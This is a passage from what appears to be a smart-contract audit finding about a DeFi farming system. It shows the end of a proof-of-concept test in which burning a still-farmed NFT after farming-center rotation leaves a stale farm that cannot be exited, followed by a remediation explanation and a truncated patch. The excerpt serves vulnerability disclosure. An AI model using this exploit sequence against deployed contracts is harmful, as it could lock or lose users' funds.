    const staleFirstFarmAfterBurn = await context.eternalFarming.farms(tokenId, firstIncentiveId);
    expect(staleFirstFarmAfterBurn.liquidity).to.equal(firstFarmBeforeRotation.liquidity);
    expect(await context.nft.tokenFarmedIn(tokenId)).to.equal(ethers.ZeroAddress);
    await expect(context.nft.ownerOf(tokenId)).to.be.reverted;
    await expect(context.farmingCenter.connect(lp).exitFarming(firstKey, tokenId)).to.be.reverted;
  });
});
```

## Remediation
### Explanation

Track active farming memberships in both the NFT manager and farming engine, prohibit either farming-center pointer from rotating while farms remain active, enforce one active center per NFT, and prevent burning a still-farmed NFT. This forces active farms to exit and settle before center replacement or NFT destruction.
### Patch

```diff
     ) private returns (uint128 tokensOwed0, uint128 tokensOwed1) {
```
